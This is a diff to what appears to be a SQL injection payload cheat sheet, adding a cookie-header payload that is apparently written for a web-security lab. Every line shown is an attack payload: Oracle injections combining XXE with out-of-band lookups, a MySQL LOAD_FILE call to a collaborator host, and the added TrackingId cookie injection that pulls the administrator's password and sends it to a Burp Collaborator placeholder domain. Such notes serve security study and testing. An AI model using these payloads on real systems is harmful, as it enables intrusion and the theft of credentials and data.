@@ -152,6 +152,9 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 -- SQLI + XXE OOB -> EXTRACT DATA --
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<OOB_URL_CONCAT_EXPRESSION>)||'.<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;
 
+Cookie: TrackingId='union SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||'FOO.'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<BURP-COLAB>/">+%25remote%3b]><root>%26remote%3b</root>'),'/l')+FROM+dual--%3b'; session=uusQnFTiIjfdetXz7v1zm2KKNYqU46MI'
+
+
 -- OOB -> READ FILES 
 SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');
 
